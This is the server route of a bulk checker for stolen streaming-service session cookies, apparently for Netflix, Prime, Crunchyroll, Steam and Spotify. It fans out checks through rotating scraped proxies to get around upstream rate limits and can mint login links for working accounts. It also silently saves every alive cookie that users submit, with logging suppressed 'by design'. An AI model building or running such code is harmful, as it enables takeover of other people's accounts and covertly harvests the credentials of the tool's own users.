import { type NextRequest, NextResponse } from "next/server"
import { waitUntil } from "@vercel/functions"
import { clientIp, consumeRateLimit } from "@/lib/rate-limit"
import { recordChecks, recordRateLimitBlock, recordUser } from "@/lib/metrics"
import { type CheckErrorCategory } from "@/lib/check-errors"
import type { CheckResult } from "@/lib/normalize-upstream"
import { type ProxyDialInfo } from "@/lib/proxies"
import { pruneDispatchers } from "@/lib/proxy-dispatcher"
import { getServerLiveProxies } from "@/lib/server-live-proxies"
// Robust check logic shared with the saved-recheck automation so every checker
// gets the same proxy-failover + dead-confirmation accuracy.
import { checkNetflixWithLinks, checkOne, checkPrimeDirectConfirmed, createProxyPoolChecker, type Service } from "@/lib/check-via-proxies"
import { isAliveResult } from "@/lib/cookie-utils"
// Per-service alive-cookie stores. Public checks silently auto-save alive hits here
// (see autoSaveAlive) so nothing is lost while the app is still open access.
import { type AliveEntry, saveAliveCookies } from "@/lib/saved-cookies"
import { saveAlivePrimeCookies } from "@/lib/saved-prime-cookies"
import { saveAliveCrunchyrollCookies } from "@/lib/saved-crunchyroll-cookies"
import { saveAliveSteamCookies } from "@/lib/saved-steam-cookies"
import { saveAliveSpotifyCookies } from "@/lib/saved-spotify-cookies"
import { getCheckerVisibility, isCheckerVisible, type CheckerService } from "@/lib/checker-visibility"
import { isAdminAuthenticated } from "@/lib/admin-auth"

export const runtime = "nodejs"
// Give each invocation enough headroom that a small chunk (a handful of cookies,
// each with retries) always completes before the platform kills it. The client
// uses small chunks + its own per-request timeout, so this is a safety margin,
// not a target. Vercel caps this per plan; it's clamped to the plan max.
export const maxDuration = 60

// Max concurrent Netflix requests per batch call. MEASURED: hitting Netflix
// directly (native checker), it serves 60 concurrent requests from one IP in
// <300ms with zero errors and zero rate limiting — nothing like the old
// third-party API's hard 5-request ceiling. We fan out 40 at a time for fast
// bulk throughput while leaving headroom. A plain constant (no shared mutable
// state) keeps this stateless so a killed invocation can never deadlock the
// next request.
// Server-side fan-out concurrency per request. This is BOTH a memory ceiling
// (each ALIVE check holds a ~1MB account page + parsed JSON while running) AND a
// politeness ceiling toward Netflix. Each alive cookie also fans out to 3-4
// Netflix sub-requests (account page → profiles → auth token → extra-member),
// so the REAL connection count to Netflix ≈ this × lanes × ~4. At 12 × 5 lanes
// that was ~240 simultaneous connections from one IP, which Netflix's edge
// started dropping en masse ("Could not reach Netflix"). 5 keeps the effective
// footprint modest and reliable; the client's lanes + auto-retry recover the
// throughput without tripping the upstream.
const SERVER_CONCURRENCY = 5

// When a proxy pool is configured, every cookie in the batch is dialed through a
// DIFFERENT exit IP (round-robin), so the single-IP politeness ceiling no longer
// applies — we can fan out far more per request. This is what lets a large proxy
// pool actually translate into throughput instead of bottlenecking at 5.
// Public and admin proxy-backed runs share the same bounded fan-out. Both routes
// use per-exit-IP proxy rotation, per-cookie deadlines, and client-side AIMD, so
// keeping this ceiling equal prevents public runs from being artificially slower
// while the safeguards still cap total upstream pressure.
const SERVER_CONCURRENCY_PROXY_PUBLIC = 12
const SERVER_CONCURRENCY_PROXY_ADMIN = 12

// A worker must always settle before the stream can finish. Native checkers have
// their own upstream timeouts, but this outer guard protects the batch from a
// leaked socket, dispatcher, or third-party call.
const PER_COOKIE_DEADLINE_MS = 45_000
const BATCH_DEADLINE_MS = 55_000

const timeoutResult = (message = "Timed out while checking this cookie. Please retry."): CheckResult => ({
  valid: false,
  message,
  errorCategory: "timeout",
})

async function withDeadline<T>(work: Promise<T>, timeoutMs: number, fallback: T): Promise<T> {
  let timer: ReturnType<typeof setTimeout> | undefined
  try {
    return await Promise.race([
      work,
      new Promise<T>((resolve) => {
        timer = setTimeout(() => resolve(fallback), timeoutMs)
      }),
    ])
  } finally {
    if (timer) clearTimeout(timer)
  }
}

// Hard caps to bound a single request's server-side fan-out (input validation).
// High ceiling — the client chunks well below this; it only guards against a
// single absurdly large payload. Not a throughput limit in practice.
const MAX_BATCH = 1_000
const MAX_COOKIE_LEN = 8_192

// A proxy the CLIENT scraped and reachability-tested in its own browser session
// (ephemeral — never persisted). Shape sent by lib/live-proxies.ts.
type LiveProxyInput = { protocol?: unknown; host?: unknown; port?: unknown }
type ManualProxyInput = { protocol?: unknown; host?: unknown; port?: unknown; username?: unknown; password?: unknown }

function parseManualProxies(input: unknown): ProxyDialInfo[] {
  if (!Array.isArray(input)) return []
  const out: ProxyDialInfo[] = []
  const seen = new Set<string>()
  for (const raw of input.slice(0, 400)) {
    const item = raw as ManualProxyInput
    const protocol = item.protocol === "socks5" || item.protocol === "https" ? item.protocol : "http"
    const host = typeof item.host === "string" ? item.host.trim() : ""
    const port = Number(item.port)
    const username = typeof item.username === "string" ? item.username : null
    const password = typeof item.password === "string" ? item.password : null
    if (!host || !Number.isInteger(port) || port < 1 || port > 65535) continue
    const id = `manual:${protocol}:${username ?? ""}@${host}:${port}`
    if (seen.has(id)) continue
    seen.add(id)
    out.push({ id, protocol, host, port, username, password, isGateway: false })
  }
  return out
}

// Validates the client-supplied ephemeral proxies and maps them to dial info with
// a stable synthetic id (so the dispatcher cache can warm/prune them). These have
// no credentials (free proxies) and are NEVER written to the database.
function parseLiveProxies(input: unknown): ProxyDialInfo[] {
  if (!Array.isArray(input)) return []
  const out: ProxyDialInfo[] = []
  const seen = new Set<string>()
  for (const raw of input.slice(0, 400)) {
    const r = raw as LiveProxyInput
    const protocol = r.protocol === "socks5" || r.protocol === "https" ? r.protocol : "http"
    const host = typeof r.host === "string" ? r.host.trim() : ""
    const port = Number(r.port)
    if (!host || !Number.isInteger(port) || port < 1 || port > 65535) continue
    const id = `live:${protocol}:${host}:${port}`
    if (seen.has(id)) continue
    seen.add(id)
    out.push({ id, protocol, host, port, username: null, password: null, isGateway: false })
  }
  return out
}

export async function POST(req: NextRequest) {
  let body: {
    cookie?: string
    cookies?: string[]
    includeLinks?: boolean
    sessionId?: string
    liveProxies?: unknown
    manualProxies?: unknown
    service?: unknown
  }
  try {
    body = await req.json()
  } catch {
    return NextResponse.json({ valid: false, message: "Invalid request body." }, { status: 400 })
  }

  const ip = clientIp(req)
  // Count this visitor toward the distinct-users metric (HLL). waitUntil so the
  // write isn't dropped when Vercel suspends the function after the response.
  waitUntil(recordUser(ip))
  // Auth links (login URLs) are an opt-in extra Netflix request — off by default.
  const includeLinks = body.includeLinks === true
  // Which streaming service to validate against. Defaults to Netflix so existing
  // callers are unchanged; the Prime UI sends `service: "prime"` and the
  // Crunchyroll UI sends `service: "crunchyroll"`.
  const service: Service =
    body.service === "prime"
      ? "prime"
      : body.service === "crunchyroll"
        ? "crunchyroll"
        : body.service === "steam"
          ? "steam"
            : body.service === "spotify"
              ? "spotify"
              : "netflix"

  // CPU GUARD. Checking is the app's most expensive server work (proxy dials +
  // multiple upstream requests per cookie, up to 60s). When an admin has hidden a
  // service's PUBLIC checker, this endpoint must refuse public checks for it —
  // otherwise cached tabs, direct URLs, the browser extension, and bots keep
  // triggering full runs and pin Fluid Active CPU even though the UI is hidden.
  // Steam/Spotify have no public route, so they are only reachable by an admin.
  // Admins are always allowed so the panel's own embedded checkers keep working.
  const adminRequest = await isAdminAuthenticated()
  if (!adminRequest) {
    if (service === "steam" || service === "spotify") {
      return NextResponse.json({ valid: false, message: "This checker is unavailable." }, { status: 403 })
    }
    const vis = await getCheckerVisibility()
    if (!isCheckerVisible(vis, service as CheckerService)) {
      return NextResponse.json({ valid: false, message: "This checker is currently unavailable." }, { status: 403 })
    }
  }

  // ----- Batch mode (#3): one round-trip, fanned out server-side. -----
  if (Array.isArray(body.cookies)) {
    const cookies = body.cookies
      .map((c) => (typeof c === "string" ? c.trim() : ""))
      .filter(Boolean)
      .slice(0, MAX_BATCH)
      .map((c) => c.slice(0, MAX_COOKIE_LEN))

    // Rate limit by number of cookies so a big batch counts proportionally.
    const rl = await consumeRateLimit(ip, cookies.length || 1)
    if (!rl.success) {
      waitUntil(recordRateLimitBlock())
      return rateLimitedResponse(rl)
    }

    // LIVE PROXIES ONLY. The client scrapes + Netflix-tests free proxies in its own
    // browser session and sends the fastest WORKING survivors here (`liveProxies`),
    // already sorted fastest-first. Each cookie is dialed through a DIFFERENT exit
    // IP (round-robin) so load spreads across many proxies (≈ threads-per-proxy) and
    // no single IP trips Netflix's connect limit. Nothing is read from or written to
    // a database — there is no proxy DB anymore. When no proxies are attached, every
    // bulk run (admin included) gets "try again shortly" — never the server IP.
    const proxies = parseManualProxies(body.manualProxies)
    const liveProxies = proxies.length > 0 ? [] : parseLiveProxies(body.liveProxies)
    const activeProxies = proxies.length > 0 ? proxies : liveProxies
    if (activeProxies.length > 0) pruneDispatchers(new Set(activeProxies.map((p) => p.id)))

    // Robust pool checker (shared with the saved-recheck automation): per-cookie
    // proxy fail-over on 403/429/timeout + a DEAD_CONFIRMATIONS quorum so a single
    // flagged proxy can't produce a false dead. Learned proxy health is shared
    // across every cookie in this batch.
    let currentProxies = activeProxies
    let checkViaProxy = createProxyPoolChecker(currentProxies, { includeLinks, service })
    let refreshPromise: Promise<void> | null = null
    let proxyRefreshUsed = false

    // A proxy can die after the client's reachability probe. Refresh once per batch
    // and requeue every cookie that was affected by the failed/slow proxy pool.
    // The shared promise prevents concurrent workers from starting duplicate scrapes.
    const refreshProxyPool = async (): Promise<boolean> => {
      if (proxyRefreshUsed) return false
      proxyRefreshUsed = true
      if (!refreshPromise) {
        refreshPromise = getServerLiveProxies({ limit: 300 }).then((fresh) => {
          if (fresh.length === 0) return
          currentProxies = fresh
          checkViaProxy = createProxyPoolChecker(currentProxies, { includeLinks, service })
          pruneDispatchers(new Set(currentProxies.map((p) => p.id)))
        }).catch(() => undefined)
      }
      await refreshPromise
      return currentProxies.length > 0
    }

    const results: CheckResult[] = new Array(cookies.length)
    const startedAt = Date.now()
    const hasProxies = activeProxies.length > 0
    const concurrency = hasProxies
    ? adminRequest
      ? SERVER_CONCURRENCY_PROXY_ADMIN
      : SERVER_CONCURRENCY_PROXY_PUBLIC
    : SERVER_CONCURRENCY

    // No-proxy verdict for ALL bulk users (public AND admin): a bulk run must NEVER
    // dial Netflix from the shared server IP, so without a proxy pool there's nothing
    // to route through and the cookie is retried shortly. (The single-cookie checker
    // is a separate path that still goes direct — one cookie can't trigger limits.)
    const noProxyResult: CheckResult = {
      valid: false,
      message: "No proxy available right now. Please try again shortly.",
      errorCategory: "upstream_unavailable",
    }

    // STREAM per-cookie verdicts as NDJSON, flushed the INSTANT each cookie is
    // resolved — instead of waiting for the whole batch's `runPool` to finish. This
    // is what stops one slow cookie (several proxy hops) from holding up the other
    // 9 in its batch: the client updates each row as its verdict arrives. The first
    // line is a `meta` with the proxy count; each `result` line carries its index.
    const encoder = new TextEncoder()
    const headers = new Headers(rateLimitHeaders(rl))
    headers.set("Content-Type", "application/x-ndjson; charset=utf-8")
    headers.set("Cache-Control", "no-store, no-transform")

    const stream = new ReadableStream<Uint8Array>({
      async start(controller) {
        const send = (obj: unknown) => {
          try {
            controller.enqueue(encoder.encode(JSON.stringify(obj) + "\n"))
          } catch {
            // controller closed (client navigated away) — ignore.
          }
        }
        send({ type: "meta", proxies: activeProxies.length })
        try {
          await withDeadline(
            (async () => {
              const pending = Array.from({ length: cookies.length }, (_, i) => i)
              let nextPending = 0
              const worker = async () => {
                while (nextPending < pending.length) {
                  const i = pending[nextPending++]
                  const r: CheckResult = await withDeadline(
                    service === "steam" || service === "spotify"
                      ? checkOne(cookies[i], { includeRaw: false, includeLinks, service, timeoutMs: PER_COOKIE_DEADLINE_MS })
                      : currentProxies.length > 0
                        ? checkViaProxy(cookies[i], i % currentProxies.length)
                        : Promise.resolve(noProxyResult),
                    PER_COOKIE_DEADLINE_MS,
                    timeoutResult(),
                  )
                  const retryable = service !== "steam" && service !== "spotify" &&
                    ["upstream_unavailable", "upstream_error", "timeout", "rate_limited"].includes(r.errorCategory ?? "")
                  if (retryable && proxies.length === 0 && await refreshProxyPool()) {
                    pending.push(i)
                    continue
                  }
                  results[i] = r
                  send({ type: "result", index: i, result: r })
                }
              }
              await Promise.all(Array.from({ length: Math.min(concurrency, cookies.length) }, () => worker()))
            })(),
            BATCH_DEADLINE_MS,
            undefined,
          )
          // A batch deadline can fire while a runner is still awaiting an upstream
          // promise. Emit deterministic results for every missing index so clients
          // never remain at N-1/N forever.
          for (let i = 0; i < cookies.length; i++) {
            if (!results[i]) {
              results[i] = timeoutResult("Batch deadline reached. Please retry this cookie.")
              send({ type: "result", index: i, result: results[i] })
            }
          }
          // waitUntil (NOT bare `void`): on Vercel the function is frozen the moment
          // the stream closes below, which would kill this detached Redis write before
          // it flushed — the reason the dashboard read 0 for every metric in prod
          // despite real runs. waitUntil keeps the lambda alive until the write lands.
          waitUntil(recordRun(results, Date.now() - startedAt))
          // Silently persist any alive hits (server-side, no client round-trip).
          waitUntil(autoSaveAlive(service, cookies, results))
          send({ type: "done" })
        } catch (err) {
          send({ type: "error", error: err instanceof Error ? err.message : "Batch failed." })
        } finally {
          controller.close()
        }
      },
    })

    return new Response(stream, { headers })
  }

  // ----- Single mode: keeps `raw` for the detailed report card. -----
  const cookie = body.cookie?.trim().slice(0, MAX_COOKIE_LEN)
  if (!cookie) {
    return NextResponse.json({ valid: false, message: "No cookie provided." }, { status: 400 })
  }

  const rl = await consumeRateLimit(ip, 1)
  if (!rl.success) {
    waitUntil(recordRateLimitBlock())
    return rateLimitedResponse(rl)
  }

  const singleStartedAt = Date.now()
  // FASTEST + NO FALSE DEADS: a single check is exactly ONE cookie = at most a
  // handful of sequential requests, so it goes DIRECT from the server IP for both
  // admin and public — no proxy scrape wait, no proxy hop, no proxy-induced false
  // "dead" (a flaky exit IP serving Netflix a /login challenge for a VALID cookie).
  // The rate limiter already throttles abuse of the shared IP, and `checkOne` runs
  // the bounded retry loop (NOT failFast), so a transient 429/5xx/timeout is
  // retried and surfaced as an errorCategory — never mislabeled as a dead cookie.
  // PRIME goes through the proxy-confirmed direct checker: Amazon bounces foreign
  // (non-US) sessions hit from our US datacenter IP to sign-in, which reads as a
  // false "expired". Confirming a direct dead through a live proxy fixes that
  // without slowing down alive/error results.
  // NETFLIX goes through the link-confirming direct checker: the verdict stays
  // direct (fast, no false deads), but if auth links were requested and the direct
  // FTL mint got bot-blocked from our datacenter IP (leaving links empty), we
  // re-mint through live proxies so "Copy full details" reliably includes the
  // PC/Mobile/TV links — matching what the bulk checker already produces.
  // Other services stay purely direct.
  const result =
    service === "prime"
      ? (await checkPrimeDirectConfirmed(cookie, { includeRaw: true, includeLinks })).result
      : service === "netflix"
        ? (await checkNetflixWithLinks(cookie, { includeRaw: true, includeLinks })).result
        : await checkOne(cookie, { includeRaw: true, includeLinks, service })
  // waitUntil so the metrics write survives the immediate JSON response below
  // (a bare `void` is dropped when Vercel suspends the function after responding).
  waitUntil(recordRun([result], Date.now() - singleStartedAt))
  // Silently persist this cookie if it's alive (server-side, no client round-trip).
  waitUntil(autoSaveAlive(service, [cookie], [result]))
  // Always 200: the structured `errorCategory` in the body conveys upstream/
  // network failures. Returning 5xx here only pollutes the browser console and
  // Network tab with "failed resource" errors for what is a handled condition.
  return NextResponse.json(result, { headers: rateLimitHeaders(rl) })
}

// Aggregates a run's results into metrics (fire-and-forget). `durationMs` is the
// wall-clock time of the whole run so the dashboard can show average latency.
async function recordRun(results: CheckResult[], durationMs?: number): Promise<void> {
  let alive = 0
  let dead = 0
  let error = 0
  const errorCategories: Partial<Record<CheckErrorCategory, number>> = {}
  for (const r of results) {
    if (r.errorCategory) {
      error++
      errorCategories[r.errorCategory] = (errorCategories[r.errorCategory] ?? 0) + 1
    } else if (r.valid) {
      alive++
    } else {
      dead++
    }
  }
  await recordChecks({ total: results.length, alive, dead, error, errorCategories, durationMs })
}

// Silently persists a check's ALIVE cookies to the correct per-service store.
//
// This is deliberately quiet: it runs SERVER-SIDE (so there is no extra client
// request in the Network tab), returns nothing to the caller, shows no toast, and
// writes NOTHING to the developer console — success or failure. Any storage error
// is swallowed so a DB hiccup can never affect, slow, or leak into the user's check.
// It's invoked via waitUntil so the write survives the response on Vercel.
//
// `cookies` and `results` are index-aligned (cookies[i] was checked → results[i]).
// Open access for now; access control will move behind auth later, at which point
// this can be gated instead of removed.
async function autoSaveAlive(service: Service, cookies: string[], results: CheckResult[]): Promise<void> {
  try {
    const entries: AliveEntry[] = []
    for (let i = 0; i < results.length; i++) {
      const cookie = cookies[i]
      const result = results[i]
      if (cookie && result && isAliveResult(result)) entries.push({ cookie, result })
    }
    if (entries.length === 0) return

    switch (service) {
      case "prime":
        await saveAlivePrimeCookies(entries)
        break
      case "crunchyroll":
        await saveAliveCrunchyrollCookies(entries)
        break
      case "steam":
        await saveAliveSteamCookies(entries)
        break
      case "spotify":
        await saveAliveSpotifyCookies(entries)
        break
      default:
        await saveAliveCookies(entries)
    }
  } catch {
    // Intentionally silent — no logging by design.
  }
}

function rateLimitHeaders(rl: { limit: number; remaining: number; reset: number }): Record<string, string> {
  return {
    "X-RateLimit-Limit": String(rl.limit),
    "X-RateLimit-Remaining": String(Math.max(0, rl.remaining)),
    "X-RateLimit-Reset": String(rl.reset),
  }
}

function rateLimitedResponse(rl: { limit: number; remaining: number; reset: number }): NextResponse {
  const retryAfterSec = Math.max(1, Math.ceil((rl.reset - Date.now()) / 1000))
  return NextResponse.json(
    {
      valid: false,
      message: "Rate limit exceeded. Please slow down and try again shortly.",
      errorCategory: "rate_limited" satisfies CheckErrorCategory,
    },
    {
      status: 429,
      headers: { ...rateLimitHeaders(rl), "Retry-After": String(retryAfterSec) },
    },
  )
}

// Bounded-concurrency pool for fanning out batch checks server-side.
async function runPool(total: number, concurrency: number, worker: (index: number) => Promise<void>): Promise<void> {
  let next = 0
  const size = Math.max(1, Math.min(concurrency, total))
  const runners = Array.from({ length: size }, async () => {
    while (next < total) {
      const current = next++
      await worker(current)
    }
  })
  await Promise.all(runners)
}

// `normalizeUpstream`, `buildDemoResult`, and the result types now live in
// `@/lib/normalize-upstream` so the parsing logic is unit-testable without
// pulling in undici / Next server APIs.
